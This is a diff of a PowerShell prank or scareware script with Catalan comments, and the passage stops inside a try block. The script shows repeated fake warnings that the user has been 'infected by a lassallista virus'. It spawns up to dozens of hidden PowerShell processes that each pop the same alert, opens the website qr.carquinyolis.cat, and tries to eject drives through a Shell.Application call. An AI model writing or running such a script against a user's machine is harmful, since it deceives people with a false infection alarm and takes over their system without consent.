@@ -1,40 +1,34 @@
 #importa llibreria missatges
 Add-Type -AssemblyName "System.Windows.Forms"
 
-
-######################
-
 # Function to show a message box
 function Show-MessageBox {
     [System.Windows.Forms.MessageBox]::Show("Has sigut infectat per un virus lassalllista", "Alert", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
 }
 
-Start-Sleep -Seconds 4
-# Run multiple instances of message box in parallel
-for ($i = 0; $i -lt 1; $i++) {
-    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
-    Start-Sleep -Seconds 1
-}
+######################
+
+Start-Sleep -Seconds 2
+
+[System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+[System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+
 for ($i = 0; $i -lt 2; $i++) {
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
-    Start-Sleep -Seconds 1
 }
-Start-Process "https://qr.carquinyolis.cat"
+[System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+
 Start-Sleep -Seconds 4
+Start-Process "https://qr.carquinyolis.cat"
 for ($i = 0; $i -lt 40; $i++) {
-    Start-Sleep -Seconds 1
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
 }
-
-
 
 ######################
 
-
-#espera una mica per si tarda a accedir
 Start-Sleep -Seconds 4
+Start-Process "https://qr.carquinyolis.cat"
 
-#obra la disquetera si hi ha
 try {
     $eject = New-Object -ComObject Shell.Application
     $eject.NameSpace("shell:::{645FF040-5081-101B-9F08-00AA002F954E}").Items() | ForEach-Object { $_.InvokeVerb('Eject') }
